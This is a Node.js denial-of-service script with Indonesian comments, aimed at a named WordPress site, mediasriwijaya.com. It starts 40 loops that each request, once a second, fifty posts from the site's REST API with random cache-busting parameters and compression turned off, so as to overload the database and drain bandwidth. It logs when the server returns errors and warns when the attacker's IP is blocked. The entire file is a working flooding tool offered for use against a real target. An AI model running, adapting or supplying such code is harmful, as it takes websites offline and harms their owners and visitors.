const https = require('https');
const crypto = require('crypto');

const target = 'mediasriwijaya.com';
let strikeCount = 0;

function strike() {
    const options = {
        hostname: target,
        port: 443,
        // Kita minta banyak postingan sekaligus buat maksa SQL kerja keras
        path: '/wp-json/wp/v2/posts?per_page=50&_random=' + crypto.randomBytes(4).toString('hex'),
        method: 'GET',
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept-Encoding': 'identity', // Tanpa kompresi biar bandwidth server kesedot
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        },
        timeout: 15000 // Kalau 15 detik ga bales, berarti webnya udah stuck
    };

    const req = https.request(options, (res) => {
        strikeCount++;
        
        // Cek kondisi server
        if (res.statusCode >= 500) {
            console.log(`[ 💀 ] SERVER CRASHED! Status: ${res.statusCode}. Target Down?`);
        } else {
            console.log(`[ 🌀 ] Strike #${strikeCount} | Status: ${res.statusCode} | Target Stuttering...`);
        }

        // SLOW READ: Kita nggak habisin datanya cepet-cepet
        res.on('data', () => {
            // Biarkan data mengalir pelan di background
        });
    });

    req.on('timeout', () => {
        console.log("[ ⚠️ ] TIMEOUT DETECTED! Server terlalu lambat buat ngerespon.");
        req.destroy();
    });

    req.on('error', (e) => {
        // Jika koneksi ditolak (Refused), berarti IP lu mungkin kena blokir
        if (e.code === 'ECONNREFUSED') {
            console.log("[ 🚫 ] CONNECTION REFUSED: IP Lu mungkin kena Ban LiteSpeed.");
            process.exit();
        }
    });

    req.end();
}

console.log(`[ 😈 ] INITIATING NOCTERA-7 AUTO-EXHAUST PADA ${target}...`);

// Gunakan 40 jalur. Ini batas "panas" buat Termux di HP rata-rata.
const threads = 40;
for (let i = 0; i < threads; i++) {
    setInterval(strike, 1000); // Tiap jalur nembak tiap 1 detik
}
